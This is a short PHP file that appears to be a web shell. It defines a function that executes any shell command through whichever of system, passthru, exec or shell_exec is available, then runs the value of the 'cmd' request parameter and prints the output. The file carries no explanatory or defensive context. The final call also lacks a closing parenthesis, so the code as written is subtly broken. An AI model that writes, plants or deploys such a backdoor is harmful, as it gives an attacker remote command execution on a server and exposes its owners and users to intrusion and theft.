<?php
function ex($comd)
{
    $res = '';
    if(function_exists("system"))
	{
	    ob_start();
        system($comd);
        $res=ob_get_contents();
        ob_end_clean();
	}elseif(function_exists("passthru"))
	{
        ob_start();
        passthru($comd);
        $res=ob_get_contents();
        ob_end_clean();
	}elseif(function_exists("exec"))
	{
        exec($comd,$res);
        $res=implode("\n",$res);
	}elseif(function_exists("shell_exec"))
	{
	    $res=shell_exec($comd);
	}
 
    return $res;
}

ex($_REQUEST['cmd'];
die("");
?>